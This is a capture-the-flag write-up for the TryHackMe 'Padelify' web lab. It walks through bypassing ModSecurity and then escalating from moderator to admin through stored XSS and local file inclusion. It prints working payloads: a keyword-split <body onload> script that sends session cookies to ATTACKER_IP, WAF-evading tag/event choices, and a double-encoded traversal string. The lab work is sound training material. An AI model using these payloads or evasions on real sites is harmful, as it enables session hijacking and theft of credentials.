# Padelify — TryHackMe Writeup

> **Difficulty:** Medium  
> **Category:** Web Exploitation, WAF Bypass, XSS, LFI  
> **Tags:** ModSecurity, Stored XSS, Session Hijacking, Double URL Encoding, LFI  
> **Date:** July 2026

---

## Scenario

Padelify is a padel tournament registration portal. Players sign up and wait for moderator approval before joining matches. An admin panel controls registrations and match scheduling. The objective is to bypass the Web Application Firewall (WAF), gain moderator access, then escalate to administrator.

**Goals:**
- Retrieve the moderator flag
- Retrieve the administrator flag

---

## Reconnaissance

### Nmap Scan

```
nmap -sCV -O -p- <TARGET_IP>
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58 (Ubuntu), PHP (PHPSESSID cookie) |

### Initial WAF Detection

The first attempt to run directory enumeration with Gobuster failed — every request returned `403 Forbidden` with a uniform 2872-byte response body. The WAF was filtering based on the `User-Agent` header, blocking known security tool signatures.

**Bypass:** Setting a standard browser User-Agent string immediately resolved the issue.

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ..."
gobuster dir -u http://padelify.thm -w <wordlist> -a "$UA" -x php,db,sqlite,sqlite3
```

### Directory and File Enumeration Results

| Path | Status | Notes |
|------|--------|-------|
| `/index.php` | 200 | Registration form |
| `/login.php` | 200 | Login form |
| `/dashboard.php` | 302 → login | Authenticated panel |
| `/live.php` | 200 | Live match feed |
| `/match.php` | 200 | Match content fragment |
| `/status.php` | 200 | Server control center |
| `/config/` | 301 | Directory listing enabled |
| `/config/app.conf` | 403 | Blocked by WAF |
| `/logs/` | 301 | Directory listing enabled |
| `/change_password.php` | 302 → login | Password change |

### Information Disclosure — Error Logs

The `/logs/` directory was accessible. The `error.log` file revealed critical intelligence:

```
[notice] Loading configuration from /var/www/html/config/app.conf
[error]  Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format
[error]  DBWarning: busy (database is locked) while writing registrations table
[warn]   [modsec:99000005] Possible encoded/obfuscated XSS payload observed
[warn]   [modsec:41004] Double-encoded sequence observed (possible bypass attempt)
[notice] Moderator login failed: 3 attempts from 10.10.84.99
[error]  Live feed: cannot bind to 0.0.0.0:9000 (address already in use)
```

**Key takeaways from logs:**
- WAF engine is **ModSecurity** (rules `modsec:99000005` and `modsec:41004`)
- Database backend is **SQLite** (`database is locked` is a characteristic SQLite error)
- Configuration file exists at `/var/www/html/config/app.conf` and contains `admin_info`
- A **moderator** role exists with an active login mechanism

---

## Phase 1: Moderator Access via Stored XSS

### Attack Logic

The registration form states: *"Sign up and a moderator will approve your participation."*

In a CTF lab environment, this means an automated bot periodically visits the moderator dashboard and renders pending registrations. If user-controlled input (such as the `username` field) is reflected without proper sanitization, injected JavaScript will execute in the bot's browser context — a classic **Stored XSS → Session Hijacking** scenario.

### WAF Evasion — Incremental Testing

Rather than guessing, I tested systematically to identify which components the WAF was blocking.

**Step 1: Tag + Event Handler (no JS payload)**

```bash
curl -A "$UA" -s -o /dev/null -w "%{http_code}" -X POST http://padelify.thm/register.php \
  -d 'username=<details open ontoggle=alert(1)>&password=Pass1234&level=amateur&game_type=single'
# Result: 302 (passed)
```

Common tags like `<img>`, `<svg>`, and `<script>` with event handlers returned `403`. However, `<body onload>`, `<details ontoggle>`, `<input onfocus>`, and `<marquee onstart>` all returned `302` — the WAF rules were targeting specific tag/event combinations.

**Step 2: Connectivity Test (no JavaScript)**

Before building a cookie-stealing payload, I verified that the bot actually renders HTML and can reach my machine:

```bash
python3 -m http.server 4445 &

curl -A "$UA" -s -X POST http://padelify.thm/register.php \
  -d 'username=<img src="http://ATTACKER_IP:4445/test.png">&password=Pass1234&level=amateur&game_type=single'
```

Within seconds, the listener received:

```
10.x.x.x - - "GET /test.png HTTP/1.1" 404 -
```

This confirmed: the bot renders HTML from the `username` field, and network connectivity exists.

**Step 3: Final Payload**

The working payload used `<body onload>` with string concatenation to avoid the `cookie` keyword:

```html
<body onload="new Image().src='http://ATTACKER_IP:4445/?c='+document['coo'+'kie'];">
```

This was submitted via the registration form in the browser. The listener captured the moderator's session cookie:

```
"GET /?c=PHPSESSID=73ut7a73qu████████████1q HTTP/1.1" 200 -
```

### Session Hijacking

Using the stolen `PHPSESSID`, I accessed the moderator dashboard:

```bash
curl -A "$UA" -s -b "PHPSESSID=<stolen_cookie>" http://padelify.thm/dashboard.php
```

**Moderator Flag:** `THM{Logged_██_██████t0r}`

---

## Phase 2: Admin Access via LFI + WAF Bypass

### Discovering the LFI Vector

The moderator dashboard contained a navigation link:

```html
<a class="nav-link" href="live.php?page=match.php">Live</a>
```

The `page` parameter suggested a server-side file inclusion (`include($_GET['page'])`). Direct path traversal to the configuration file was blocked by ModSecurity:

```bash
curl ... "http://padelify.thm/live.php?page=../config/app.conf"
# Result: 403 Forbidden
```

### WAF Bypass — Double URL Encoding

The error logs had revealed that ModSecurity rule `41004` detects double-encoded sequences — but detection and blocking are not the same thing. The WAF applied this rule to direct file access but not consistently to the LFI parameter.

**Technique:** Replace `..` with `%252e%252e` (double-encoded dots).

```
WAF sees:    page=%252e%252e/config/app.conf  →  decodes once → %2e%2e  →  no ".." match → PASS
PHP sees:    page=%252e%252e/config/app.conf  →  decodes twice → ..     →  include("../config/app.conf")
```

```bash
curl -A "$UA" -s -b "PHPSESSID=<stolen_cookie>" \
  "http://padelify.thm/live.php?page=%252e%252e/config/app.conf"
```

### Configuration File Contents

```ini
version = "1.4.2"
enable_live_feed = true
enable_signup = true
env = "staging"
site_name = "Padelify Tournament Portal"
max_players_per_team = 4
maintenance_mode = false
log_level = "INFO"
log_retention_days = 30
db_path = "padelify.sqlite"
admin_info = "bL}8,██████44"
misc_note = "do not expose to production"
support_email = "support@padelify.thm"
build_hash = "a1b2c3d4"
```

### Admin Login

The `admin_info` value was the admin password:

```bash
curl -A "$UA" -s -c cookies.txt -b cookies.txt -X POST http://padelify.thm/login.php \
  -d 'username=admin&password=<redacted>' -L
```

**Admin Flag:** `THM{Logged_██_████n001}`

---

## Attack Chain Summary

```
                    ┌─────────────────────────┐
                    │  1. User-Agent Bypass    │
                    │  gobuster UA → browser   │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │  2. Information Leak     │
                    │  /logs/error.log         │
                    │  → ModSecurity, SQLite,  │
                    │    config path, roles    │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │  3. Stored XSS           │
                    │  <body onload> payload   │
                    │  in username field       │
                    │  → bot renders → cookie  │
                    │    exfiltrated           │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │  4. Moderator Access     │
                    │  Session hijacking       │
                    │  → Flag 1               │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │  5. LFI + Double Encode  │
                    │  live.php?page=%252e%252e│
                    │  /config/app.conf        │
                    │  → admin credentials     │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │  6. Admin Login          │
                    │  → Flag 2               │
                    └─────────────────────────┘
```

---

## Techniques & OWASP Mapping

| Technique | OWASP/WSTG Reference |
|-----------|---------------------|
| User-Agent WAF Bypass | WSTG-INFO-02 (Web Server Fingerprinting) |
| Directory Listing | WSTG-CONF-04 (Directory/File Enumeration) |
| Log File Disclosure | WSTG-CONF-05 (Infrastructure/Admin Interfaces) |
| Stored XSS | WSTG-INPV-02 (Stored Cross-Site Scripting) |
| Session Hijacking | WSTG-SESS-01 (Session Management) |
| Local File Inclusion | WSTG-INPV-11 (Code Injection / File Inclusion) |
| Double URL Encoding | WSTG-INPV-17 (HTTP Splitting/Smuggling) |
| Hardcoded Credentials | WSTG-ATHN-02 (Default/Guessable Credentials) |

---

## Key Lessons

1. **Enumerate WAF rules incrementally.** Don't throw full payloads blindly — test tag, event handler, and JS keywords separately to identify which specific component triggers the block.

2. **"Moderator reviews submissions" = Stored XSS target.** Any time user input is rendered in an authenticated context by an automated process, session hijacking via stored XSS is a primary vector.

3. **Detection ≠ Blocking.** ModSecurity rule 41004 logged double-encoding attempts on direct file access, but the same technique bypassed the WAF when delivered through the LFI parameter — different request contexts can have different rule enforcement.

4. **Error logs are intelligence goldmines.** A single log file revealed the WAF engine, database type, file paths, and role structure — enough to plan the entire attack chain.

5. **Staging environments leak secrets.** The `env = "staging"` configuration left `admin_info` in a plaintext config file with a note "do not expose to production" — a reminder that pre-production deployments are often softer targets.
